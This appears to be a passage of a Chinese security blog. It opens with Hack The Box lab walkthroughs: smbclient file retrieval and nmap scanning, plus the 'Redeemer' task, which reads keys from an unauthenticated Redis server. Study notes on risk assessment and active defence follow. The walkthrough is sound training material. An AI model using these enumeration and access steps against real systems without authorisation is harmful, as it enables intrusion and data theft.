-<p>7.What is the command we can use within the SMB shell to download the files we find?</p>
-<p>在 SMB shell 中，我们可以使用什么命令来下载找到的文件？</p>
-<p>get</p>
-<p>8.get flag</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">smbclient \\\\10.129.125.72\\WorkShares</span><br><span class="line">smb: \&gt; <span class="built_in">cd</span> James.P</span><br><span class="line">smb: \James.P\&gt; <span class="built_in">ls</span></span><br><span class="line">  .                                   D        0  Thu Jun  3 04:38:03 2021</span><br><span class="line">  ..                                  D        0  Thu Jun  3 04:38:03 2021</span><br><span class="line">  flag.txt                            A       32  Mon Mar 29 05:26:57 2021</span><br><span class="line"></span><br><span class="line">                5114111 blocks of size 4096. 1750562 blocks available</span><br><span class="line">smb: \James.P\&gt; get flag.txt</span><br><span class="line">getting file \James.P\flag.txt of size 32 as flag.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)</span><br><span class="line">smb: \James.P\&gt; <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
-<h1 id="Redeemer"><a href="#Redeemer" class="headerlink" title="Redeemer"></a>Redeemer</h1><p>默认情况下，Nmap 在正式扫描端口之前，会先向目标发一个 Ping 包（ICMP 请求）。如果目标有回应，Nmap 才会继续扫端口；如果没有回应，Nmap 为了节省时间，会直接认为机器“没开机”，从而直接结束扫描。HTB 里的很多靶机（尤其是 Windows 机器）默认开启了防火墙，会拦截并丢弃所有的 Ping 请求。</p>
-<p>👉 解决方法：听从 Nmap 的建议，加上 -Pn 参数。</p>
-<p>-Pn 的意思是：“跳过主机存活检测（不发 Ping），无脑假设目标是开机的，直接强行扫它的端口。”</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nmap 10.129.125.73</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-11 03:01 EDT</span><br><span class="line">Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (0 hosts up) scanned <span class="keyword">in</span> 3.08 seconds</span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> nmap -Pn 10.129.125.73</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-11 03:02 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> localhost (10.129.125.73)</span><br><span class="line">Host is up.</span><br><span class="line">All 1000 scanned ports on localhost (10.129.125.73) are <span class="keyword">in</span> ignored states.</span><br><span class="line">Not shown: 1000 filtered tcp ports (no-response)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 201.43 seconds</span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> nmap -p 6379 -sCV 10.129.125.73</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-11 03:15 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> localhost (10.129.125.73)</span><br><span class="line">Host is up (0.31s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">6379/tcp open  redis   Redis key-value store 5.0.7</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 8.21 seconds</span><br></pre></td></tr></table></figure>
-<p>1.Which TCP port is open on the machine?</p>
-<p>机器上哪个 TCP 端口是开放的？</p>
-<p>6379</p>
-<p>2.Which service is running on the port that is open on the machine?</p>
-<p>机器上打开的端口正在运行哪个服务？</p>
-<p>redis</p>
-<p>3.What type of database is Redis? Choose from the following options: (i) In-memory Database, (ii) Traditional Database</p>
-<p>Redis 是什么类型的数据库？请从以下选项中选择：（i）内存数据库，（ii）传统数据库</p>
-<p>In-memory Database</p>
-<p>4.Which command-line utility is used to interact with the Redis server? Enter the program name you would enter into the terminal without any arguments.</p>
-<p>哪个命令行工具用于与 Redis 服务器交互？请输入您在终端中输入的程序名称（不带任何参数）。</p>
-<p>redis-cli</p>
-<p>5.Which flag is used with the Redis command-line utility to specify the hostname?</p>
-<p>在 Redis 命令行工具中，使用哪个标志来指定主机名？</p>
-<p>-h</p>
-<p>6.Once connected to a Redis server, which command is used to obtain the information and statistics about the Redis server?</p>
-<p>连接到 Redis 服务器后，使用哪个命令可以获取有关 Redis 服务器的信息和统计信息？</p>
-<p>info</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 10.129.125.73</span><br><span class="line">10.129.125.73:6379&gt; info</span><br><span class="line"><span class="comment"># Server</span></span><br><span class="line">redis_version:5.0.7</span><br><span class="line">redis_git_sha1:00000000</span><br><span class="line">redis_git_dirty:0</span><br><span class="line">redis_build_id:66bd629f924ac924</span><br><span class="line">redis_mode:standalone</span><br><span class="line">os:Linux 5.4.0-77-generic x86_64</span><br><span class="line">arch_bits:64</span><br><span class="line">multiplexing_api:epoll</span><br><span class="line">atomicvar_api:atomic-builtin</span><br><span class="line">gcc_version:9.3.0</span><br><span class="line">process_id:756</span><br><span class="line">run_id:b9ba300da3b4f92a5a8af4ab844c8b05d21460aa</span><br><span class="line">tcp_port:6379</span><br><span class="line">uptime_in_seconds:2356</span><br><span class="line">uptime_in_days:0</span><br><span class="line">hz:10</span><br><span class="line">configured_hz:10</span><br><span class="line">lru_clock:99981</span><br><span class="line">executable:/usr/bin/redis-server</span><br><span class="line">config_file:/etc/redis/redis.conf</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>7.What is the version of the Redis server being used on the target machine?</p>
-<p>目标机器上使用的 Redis 服务器版本是什么？</p>
-<p>5.0.7</p>
-<p>8.Which command is used to select the desired database in Redis?</p>
-<p>在 Redis 中，使用哪个命令来选择所需的数据库？</p>
-<p>select</p>
-<p>9.How many keys are present inside the database with index 0?</p>
-<p>数据库中索引为 0 的数据库键有多少个？</p>
-<p>4</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">10.129.125.73:6379&gt; <span class="keyword">select</span> 0</span><br><span class="line">OK</span><br><span class="line">(0.70s)</span><br><span class="line">10.129.125.73:6379&gt; keys *</span><br><span class="line">1) <span class="string">&quot;numb&quot;</span></span><br><span class="line">2) <span class="string">&quot;temp&quot;</span></span><br><span class="line">3) <span class="string">&quot;stor&quot;</span></span><br><span class="line">4) <span class="string">&quot;flag&quot;</span></span><br><span class="line">(3.83s)</span><br><span class="line">10.129.125.73:6379&gt; get flag</span><br></pre></td></tr></table></figure>
-<p>10.Which command is used to obtain all the keys in a database?</p>
-<p>哪个命令可以用来获取数据库中的所有键？</p>
-<p>keys *</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://zyufoye.github.io/2026/03/10/%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0%E6%8A%80%E6%9C%AF/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/uploads/kehan.jpg">
-      <meta itemprop="name" content="Aono">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Aono Note">
-      <meta itemprop="description" content="专注于网络安全学习与实践的个人博客，记录AI安全、攻防技术、漏洞分析、工具使用与踩坑经验。 不生产知识，只做知识的搬运工。">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Aono Note">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2026/03/10/%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0%E6%8A%80%E6%9C%AF/" class="post-title-link" itemprop="url">风险评估技术</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2026-03-10 21:57:11 / 修改时间：21:58:03" itemprop="dateCreated datePublished" datetime="2026-03-10T21:57:11+08:00">2026-03-10</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E8%BD%AF%E8%80%83/" itemprop="url" rel="index"><span itemprop="name">软考</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h2 id="网络安全风险评估"><a href="#网络安全风险评估" class="headerlink" title="网络安全风险评估"></a>网络安全风险评估</h2><h3 id="1-网络安全风险评估概述"><a href="#1-网络安全风险评估概述" class="headerlink" title="1. 网络安全风险评估概述"></a>1. 网络安全风险评估概述</h3><ul>
-<li><strong>核心定义</strong>：依据信息安全技术和管理标准，对网络系统的<strong>保密性、完整性、可控性和可用性</strong>进行科学评价；评估<strong>脆弱性、网络安全威胁以及脆弱性被威胁者利用后所造成的实际影响</strong>，并根据<strong>安全事件发生的可能性影响大小</strong>确认风险等级。</li>
-<li><strong>本质</strong>：评估威胁者利用网络资产的脆弱性，<strong>造成网络资产损失的严重程度</strong>。</li>
-<li><strong>计算模型</strong>：网络安全风险值等价为<strong>安全事件发生的概率（可能性）与安全事件的损失的乘积</strong>，即 <strong><code>R = f (Ep, Ev)</code></strong>。</li>
-<li><strong>六大评估要素</strong>：涉及<strong>资产、威胁、脆弱性、安全措施、风险等各个要素</strong>。其中，资产因其价值受威胁，威胁者利用资产脆弱性构成威胁，安全措施修补脆弱性从而降低风险。</li>
-<li><strong>三种评估模式</strong>：<ol>
-<li><strong>自评估</strong>：依靠<strong>自身力量</strong>进行。</li>
-<li><strong>检查评估</strong>：由<strong>网络安全主管机关或业务主管机关发起</strong>。</li>
-<li><strong>委托评估</strong>：<strong>委托具有风险评估能力的专业评估机构实施的评估活动</strong>。</li>
-</ol>
-</li>
-</ul>
-<h3 id="2-网络安全风险评估核心过程"><a href="#2-网络安全风险评估核心过程" class="headerlink" title="2. 网络安全风险评估核心过程"></a>2. 网络安全风险评估核心过程</h3><p>风险评估包括：<strong>准备、资产识别、威胁识别、脆弱性识别、已有的网络安全措施分析、网络安全风险分析、网络安全风险处置与管理</strong>等多个环节。</p>
-<ul>
-<li><strong>准备阶段</strong>：首要工作是<strong>确定评估对象和范围</strong>（首先进行网络系统范围的界定），最终生成<strong>《网络风险评估范围界定报告》</strong>。</li>
-<li><strong>资产识别</strong>：包括<strong>网络资产鉴定和网络资产价值估算</strong>。资产主要分为<strong>网络设备、主机、服务器、应用、数据和文档资产</strong>。价值估算是确认其<strong>重要程度</strong>，它<strong>不是资产的物理实际经济价值，而是相对价值</strong>，以<strong>保密性、完整性和可用性</strong>为基础衡量。</li>
-<li><strong>威胁识别</strong>：分析资产<strong>有可能受到的安全危害</strong>，从<strong>威胁来源、威胁途径、威胁能力、威胁效果、威胁意图、威胁频率</strong>等方面分析。<ul>
-<li>需<strong>标记出潜在的威胁源，形成威胁列表</strong>（分自然威胁和人为威胁），并根据其<strong>表现形式分类</strong>。</li>
-<li>分析威胁者<strong>为了实现其意图，会使用各种攻击方法和工具</strong>（途径）；<strong>成功后给网络系统造成的影响</strong>如<strong>非法访问、欺骗、拒绝服务</strong>（效果）；目的如<strong>挑战、情报信息获取、恐怖主义、经济利益和报复</strong>（意图）。</li>
-<li>对出现频率进行<strong>等级化处理</strong>。</li>
-</ul>
-</li>
-<li><strong>脆弱性识别</strong>：通过各种测试方法，<strong>获得网络资产中所存在的缺陷清单</strong>。以<strong>资产为核心</strong>，识别可能被<strong>威胁利用的弱点，并对脆弱性的严重程度进行评估</strong>。依据主要是<strong>网络安全法律法规政策、标准及行业要求</strong>。<ul>
-<li>包括<strong>技术脆弱性评估</strong>（现有安全技术措施的合理性和有效性）和<strong>管理脆弱性评估</strong>（从管理上分析弱点并标识严重程度）。</li>
-</ul>
-</li>
-<li><strong>安全措施确认</strong>：确认<strong>已采取的各种预防性和保护性安全措施的有效性</strong>。</li>
-</ul>
-<h3 id="3-网络安全风险分析与计算"><a href="#3-网络安全风险分析与计算" class="headerlink" title="3. 网络安全风险分析与计算"></a>3. 网络安全风险分析与计算</h3><ul>
-<li><strong>风险分析步骤</strong>：在各项评估基础上，<strong>综合利用定性和定量的分析方法，确定风险的大小与风险等级</strong>（形成风险测量列表）。步骤依次为：对资产识别、对威胁识别、对脆弱性识别 -&gt; <strong>判断安全事件发生的可能性</strong> -&gt; <strong>计算安全事件的损失</strong> -&gt; 计算<strong>一旦发生对组织的影响，即网络安全风险值</strong>。</li>
-<li><strong>风险计算方法</strong>：<ol>
-<li><strong>定性计算</strong>：对各要素属性进行<strong>主观评估</strong>，结果分为：<strong>无关紧要、可接受、待观察、不可接受</strong>。</li>
-<li><strong>定量计算</strong>：将要素<strong>量化为数据</strong>，输出结果是一个<strong>风险数值</strong>。</li>
-<li><strong>综合计算</strong>：<strong>结合定性和定量方法</strong>进行<strong>量化赋值</strong>，输出<strong>风险数值，同时给出相应的定性结论</strong>。</li>
-<li>具体算法包含<strong>相乘法</strong>（可能性与损失相乘）和<strong>矩阵法</strong>（构造二维矩阵）。</li>
-</ol>
-</li>
-</ul>
-<h3 id="4-评估技术方法与工具"><a href="#4-评估技术方法与工具" class="headerlink" title="4. 评估技术方法与工具"></a>4. 评估技术方法与工具</h3><ul>
-<li><strong>资产信息收集</strong>：通过<strong>调查表形式，查询资产登记数据库</strong>，掌握<strong>重要资产分布</strong>。</li>
-<li><strong>网络拓扑发现</strong>：<strong>获取被评估网络信息系统的资产关联结构信息，进而获取资产信息</strong>（生成网络拓扑结构图，掌握关联情况）。</li>
-<li><strong>漏洞扫描</strong>：<strong>自动搜集待评估对象的漏洞信息，以评估其脆弱性</strong>。</li>
-<li><strong>人工检查</strong>：<strong>通过人直接操作评估对象以获取信息</strong>，需事先设计好<strong>“检查表 (CheckList)”</strong>。</li>
-<li><strong>渗透测试</strong>：<strong>获得法律授权后，模拟黑客攻击网络系统</strong>，进行<strong>安全漏洞发现、网络攻击路径构造、安全漏洞利用验证</strong>。</li>
-<li><strong>问卷调查</strong>：采用<strong>书面的形式获得相关信息</strong>，<strong>根据调查对象进行分别设计</strong>（分<strong>管理类和技术类</strong>）。</li>
-<li><strong>安全访谈</strong>：通过专家与<strong>使用人员、管理人员等相关人员进行直接交谈</strong>。</li>
-<li><strong>审计数据分析</strong>：<strong>通常用于威胁识别</strong>，作用包括<strong>侵害行为检测、异常事件监测、潜在攻击征兆发觉等</strong>（采用特征模式匹配等技术）。</li>
-<li><strong>入侵监测</strong>：将设备接入网络，<strong>采集评估对象的威胁信息和安全状态</strong>。</li>
-</ul>
-<h3 id="5-评估项目流程与规范"><a href="#5-评估项目流程与规范" class="headerlink" title="5. 评估项目流程与规范"></a>5. 评估项目流程与规范</h3><ul>
-<li><strong>五大流程</strong>：<strong>评估工程前期准备、评估方案设计与论证、评估方案实施、评估报告撰写、评估结果评审与认可</strong>。</li>
-<li><strong>前期准备</strong>：是<strong>后续工作开展的前提</strong>，需<strong>确定对象、界定范围、粒度和时间等</strong>。开始前<strong>一定要签订合同和保密协议</strong>。需要<strong>多方面的协调，必要的、充分的准备是风险评估成功的关键</strong>。</li>
-<li><strong>方案设计与论证</strong>：<strong>依据被评估方的安全需求来制定，需经过双方讨论并论证通过后方可进行下一步工作</strong>。涵盖<strong>评估方法、评估人员组织、评估工具选择、预期风险分析、评估实施计划等</strong>。</li>
-<li><strong>方案实施</strong>：<strong>在论证通过后，才能组织相关人员进行实施</strong>。包含<strong>基本情况调查、安全需求挖掘以及确定具体操作步骤</strong>。<ul>
-<li><strong>红线要求</strong>：<strong>应避免改变系统的任何设置或必须备份系统原有的配置，并书面记录操作过程和相关数据</strong>；必须有<strong>工作备忘录</strong>；敏感系统测试<strong>要求至少两人，且必须领导签字批准</strong>。</li>
-</ul>
-</li>
-<li><strong>报告撰写</strong>：<strong>完成评估报告撰写</strong>，它是<strong>风险评估结果的记录文件，是组织实施风险管理的主要依据</strong>。内容包括<strong>评估范围、计算方法、问题归纳及描述、风险级数、安全建议等</strong>。</li>
-<li><strong>评审与认可</strong>：<strong>最高管理层或其委托的机构应组织召开评估工作结束会议，总结评估工作，对风险评估活动进行评审</strong>。对结果的验收是<strong>本次风险评估活动结束的标志</strong>，最后将经验形成<strong>书面文字材料</strong>备案。</li>
-</ul>
-<h3 id="6-技术应用场景与前沿"><a href="#6-技术应用场景与前沿" class="headerlink" title="6. 技术应用场景与前沿"></a>6. 技术应用场景与前沿</h3><ul>
-<li><strong>四大应用场景</strong>：<strong>网络安全规划和设计；网络安全等级保护；网络安全运维与应急响应；数据安全管理与运营</strong>。</li>
-<li><strong>OWASP Web应用风险评估6步法</strong>：<ol>
-<li><strong>确定风险类别</strong>。</li>
-<li><strong>评估可能性的因素</strong>（从<strong>攻击者因素、漏洞因素分析</strong>）。</li>
-<li><strong>评估影响的因素</strong>（包括<strong>技术影响因素、业务影响因素</strong>）。</li>
-<li><strong>确定风险的严重程度</strong>。</li>
-<li><strong>决定修复内容</strong>（规则是<strong>首先修复最严重的风险</strong>）。</li>
-<li><strong>定制合适的风险评级模型</strong>。</li>
-</ol>
-</li>
-<li><strong>ICT供应链安全</strong>：面临风险目标为完整性、保密性、可用性及可控性（<strong>ICT供应链</strong>概念）。</li>
-<li><strong>人工智能 (AI) 安全风险分析</strong>：核心是防范<strong>对人工智能系统的攻击、侵入、干扰、破坏和非法利用以及意外事故，使系统处于稳定可靠的运行状态</strong>。主要面临5大风险：<ol>
-<li><strong>人工智能训练数据安全风险</strong>。</li>
-<li><strong>人工智能算法安全风险</strong>。</li>
-<li><strong>人工智能系统代码实现安全风险</strong>。</li>
-<li><strong>人工智能技术滥用风险</strong>。</li>
-<li><strong>高度自治智能系统导致社会安全风险</strong>。</li>
-</ol>
-</li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://zyufoye.github.io/2026/03/10/%E4%B8%BB%E5%8A%A8%E9%98%B2%E5%BE%A1%E6%8A%80%E6%9C%AF/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/uploads/kehan.jpg">
-      <meta itemprop="name" content="Aono">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Aono Note">
-      <meta itemprop="description" content="专注于网络安全学习与实践的个人博客，记录AI安全、攻防技术、漏洞分析、工具使用与踩坑经验。 不生产知识，只做知识的搬运工。">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Aono Note">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2026/03/10/%E4%B8%BB%E5%8A%A8%E9%98%B2%E5%BE%A1%E6%8A%80%E6%9C%AF/" class="post-title-link" itemprop="url">主动防御技术</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2026-03-10 21:57:01 / 修改时间：21:58:25" itemprop="dateCreated datePublished" datetime="2026-03-10T21:57:01+08:00">2026-03-10</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E8%BD%AF%E8%80%83/" itemprop="url" rel="index"><span itemprop="name">软考</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h2 id="主动防御技术"><a href="#主动防御技术" class="headerlink" title="主动防御技术"></a>主动防御技术</h2><h3 id="1-入侵阻断技术与应用-IPS-SPS"><a href="#1-入侵阻断技术与应用-IPS-SPS" class="headerlink" title="1. 入侵阻断技术与应用 (IPS/SPS)"></a>1. 入侵阻断技术与应用 (IPS/SPS)</h3><ul>
-<li><strong>核心理念</strong>：网络安全的<strong>主动防御</strong>方法，其基本原理是对目标对象的<strong>网络攻击行为进行阻断</strong>。</li>
-<li><strong>技术实现</strong>：<ul>
-<li><strong>入侵防御系统 (IPS)</strong>：根据<strong>网络包的特性及上下文进行攻击行为判断</strong>。为解决性能瓶颈，商用多采用<strong>硬件方式</strong>或基于<strong>旁路阻断 (SPS)</strong>。</li>
-<li><strong>旁路阻断 (SPS)</strong>：一般<strong>对网络延迟影响不大</strong>。</li>
-</ul>
-</li>
-<li><strong>主要作用</strong>：<strong>过滤掉有害的网络信息流，阻断入侵者对目标的攻击行为</strong>。</li>
-</ul>
-<h3 id="2-软件白名单技术与应用"><a href="#2-软件白名单技术与应用" class="headerlink" title="2. 软件白名单技术与应用"></a>2. 软件白名单技术与应用</h3><ul>
-<li><strong>核心原理</strong>：<strong>设置可信任的软件名单列表，以阻止恶意的软件在相关的网络信息系统运行</strong>。</li>
-<li><strong>应用机制</strong>：<ul>
-<li>应用审查设立<strong>初审、复审、终审</strong>三个环节，发布过程分为<strong>公示和发布</strong>两个阶段，以<strong>构建安全、可信的移动互联网安全生态环境</strong>。</li>
-<li><strong>恶意代码防护</strong>：相比黑名单，白名单能更好防范零日漏洞。</li>
-<li><strong>白环境保护</strong>：核心在于“三可信”——<strong>只有可信任的设备才能接入；只有可信任的消息才能传输；只有可信任的软件才允许执行</strong>。</li>
-</ul>
-</li>
-</ul>
-<h3 id="3-网络流量清洗技术与应用"><a href="#3-网络流量清洗技术与应用" class="headerlink" title="3. 网络流量清洗技术与应用"></a>3. 网络流量清洗技术与应用</h3><ul>
-<li><strong>工作原理 (三步曲)</strong>：<ol>
-<li><strong>流量检测</strong>：基于深度包检测 <strong>(DPI)</strong> 识别异常，<strong>快速识别隐藏在背景流量中的攻击包</strong>。</li>
-<li><strong>流量牵引与清洗</strong>：将目标系统的流量<strong>动态转发到流量清洗中心</strong>，<strong>拒绝对指向目标系统的恶意流量进行路由转发</strong>。</li>
-<li><strong>流量回注</strong>：将<strong>清洗后的干净流量回送给目标系统</strong>。</li>
-</ol>
-</li>
-<li><strong>典型应用</strong>：畸形数据报文过滤、抗拒绝服务攻击 (DDoS)、Web应用保护、<strong>DDoS高防IP服务（采用代理转发模式，流量牵引到高防IP）</strong>。</li>
-</ul>
-<h3 id="4-可信计算技术与应用-核心重点"><a href="#4-可信计算技术与应用-核心重点" class="headerlink" title="4. 可信计算技术与应用 (核心重点)"></a>4. 可信计算技术与应用 (核心重点)</h3><ul>
-<li><strong>概念发展</strong>：早期集中于<strong>操作系统的安全机制和容错计算</strong>。由TCPA演进为TCG，制定了<strong>TPM（可信平台模块）</strong>和<strong>TNC（可信网络连接）</strong>标准。</li>
-<li><strong>信任体系</strong>：<strong>TPM是信任根</strong>。包含三个根：<strong>可信度量根RTM</strong>、<strong>可信存储根RTS</strong>、<strong>可信报告根RTR</strong>。目的是<strong>从硬件、BIOS、操作系统等各个层次上增强计算系统平台的可信性</strong>。</li>
-<li><strong>中国标准</strong>：建立起以自主密码算法 <strong>TCM为核心</strong> 的标准，由<strong>可信密码模块(TCM)和TCM服务模块(TSM)</strong>组成。</li>
-<li><strong>TNC 三层架构</strong>：<strong>完整性度量层</strong>（搜集和验证）、<strong>完整性评估层</strong>（评估状况）、<strong>网络访问层</strong>（请求处理与授权）。</li>
-</ul>
-<h3 id="5-数字水印技术与应用"><a href="#5-数字水印技术与应用" class="headerlink" title="5. 数字水印技术与应用"></a>5. 数字水印技术与应用</h3><ul>
-<li><strong>核心原理</strong>：通过<strong>数字信号处理方法，在数字化的媒体文件中嵌入特定的标记</strong>。分为<strong>水印的嵌入和水印的提取</strong>。</li>
-<li><strong>两大核心算法</strong>：<ol>
-<li><strong>空间域方法</strong>：<strong>直接叠加到数字载体的空间域上</strong>。典型如Schyndel算法（即<strong>最低有效位算法 LSB</strong>，按像素点逐一嵌入<strong>最低位上</strong>）和Patchwork算法（改变<strong>统计特性</strong>）。</li>
-<li><strong>变换域方法</strong>：利用<strong>扩展频谱通信技术</strong>和<strong>离散余弦变换(DCT)</strong>，将水印叠加到<strong>DCT域中幅值最大的前L个系数上（不包括直流分量）</strong>。</li>
-</ol>
-</li>
-<li><strong>应用场景</strong>：<strong>版权保护、信息隐藏</strong>（提升保护程度）、<strong>信息溯源、访问控制</strong>。</li>
-</ul>
-<h3 id="6-网络攻击陷阱技术-蜜罐-陷阱网络"><a href="#6-网络攻击陷阱技术-蜜罐-陷阱网络" class="headerlink" title="6. 网络攻击陷阱技术 (蜜罐/陷阱网络)"></a>6. 网络攻击陷阱技术 (蜜罐/陷阱网络)</h3><ul>
-<li><strong>核心理念</strong>：一种<strong>主动的防御方法</strong>，帮助防守方<strong>获得信息优势</strong>。能<strong>消耗攻击者资源、加重工作量、迷惑/跟踪攻击者、制止破坏行为，形成威慑</strong>。</li>
-<li><strong>蜜罐主机技术</strong>：<ul>
-<li><strong>空系统</strong>：<strong>标准的机器，运行着真实完整的OS及程序</strong>，包含<strong>真实系统中的漏洞</strong>。</li>
-<li><strong>镜像系统</strong>：建立<strong>提供敌手感兴趣的服务的服务器镜像</strong>，具有<strong>较强的欺骗性</strong>。</li>
-<li><strong>虚拟系统</strong>：在<strong>真实物理机上运行仿真软件</strong>，运行<strong>多个不同OS（虚拟机）</strong>。</li>
-</ul>
-</li>
-<li><strong>陷阱网络发展</strong>：<ul>
-<li>第一代：<strong>多个设备共同组成</strong>，不对外限制但<strong>对内加强控制</strong>，必须<strong>获取系统活动记录（远程日志、监控软件）</strong>。</li>
-<li>第二代：实现<strong>集成系统</strong>（监控非授权、隐蔽性更强、可积极响应限制非法活动）。</li>
-<li>第三代：<strong>虚拟陷阱网络 (Virtual Honeynets)</strong>，将功能<strong>集中到一个物理设备中运行</strong>。</li>
-</ul>
-</li>
-</ul>
-<h3 id="7-入侵容忍及系统生存技术"><a href="#7-入侵容忍及系统生存技术" class="headerlink" title="7. 入侵容忍及系统生存技术"></a>7. 入侵容忍及系统生存技术</h3><ul>
-<li><strong>核心理念</strong>：<strong>安全3.0理念是容忍入侵</strong>（区别于1.0挡在门外，2.0检测隔离），目标是实现<strong>网络安全弹性，具有容侵能力、可恢复能力</strong>。</li>
-<li><strong>生存性3R方法</strong>：将系统划分为<strong>不可攻破的安全核和可恢复部分</strong>（假定<strong>基本服务不可攻破</strong>）。包含三策略：<strong>抵抗(Resistance)、识别(Recognition)、恢复(Recovery)</strong>。</li>
-<li><strong>关键技术与应用</strong>：<ul>
-<li><strong>分布式共识</strong>（如<strong>区块链</strong>，<strong>众多对等节点组成，去中心化</strong>，避免单一缺陷）。</li>
-<li><strong>门限密码</strong>（如<strong>弹性CA系统</strong>，<strong>容忍一台或多台设备被入侵</strong>，将私钥<strong>分解成若干个数的和</strong>）。</li>
-<li><strong>主动恢复</strong>（周期性<strong>转变到可信状态</strong>）与<strong>多样性设计</strong>（避免通用模式失效）。</li>
-</ul>
-</li>
-</ul>
-<h3 id="8-隐私保护技术与应用"><a href="#8-隐私保护技术与应用" class="headerlink" title="8. 隐私保护技术与应用"></a>8. 隐私保护技术与应用</h3><ul>
